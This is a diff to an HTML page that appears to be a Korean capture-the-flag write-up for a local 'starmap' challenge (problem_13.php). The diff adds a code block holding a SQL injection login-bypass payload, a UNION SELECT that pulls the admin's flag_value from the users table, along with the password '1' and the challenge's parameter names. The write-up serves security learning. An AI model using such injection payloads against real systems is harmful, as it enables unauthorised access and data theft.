@@ -809,9 +809,7 @@ function encodeSecret($secret) {
       </p>
       <pundefined>
         <pre class="code-block shell-block">
-          <span   ></span
-        ><span   >&#xa0; </span
-        >
+          a' UNION SELECT 'admin_logged', flag_value FROM users WHERE username = 'admin' --  
           </pre>
         <spanundefined>대입</span>
       </p>
@@ -819,8 +817,10 @@ function encodeSecret($secret) {
         <span>Password : </span>
       </p>
       <pundefined>
-        <spanundefined>1</span
-        ><spanundefined> 대입</span>
+        <pre class="code-block shell-block">
+          1
+          </pre>  
+      <spanundefined> 대입</span>
       </p>
       <pundefined>
         <spanundefined>&#xa0;</span>
@@ -848,7 +848,7 @@ function encodeSecret($secret) {
         <span>Parameter 이름 획득 -&gt; zone, secret</span>
       </p>
       <pundefined>
-        <span   >localhost/starmap/problem_13.php?zone=secret</span
+        <span>localhost/starmap/problem_13.php?zone=secret</span
         ><spanundefined> 로 이동</span>
       </p>
       <pundefined>
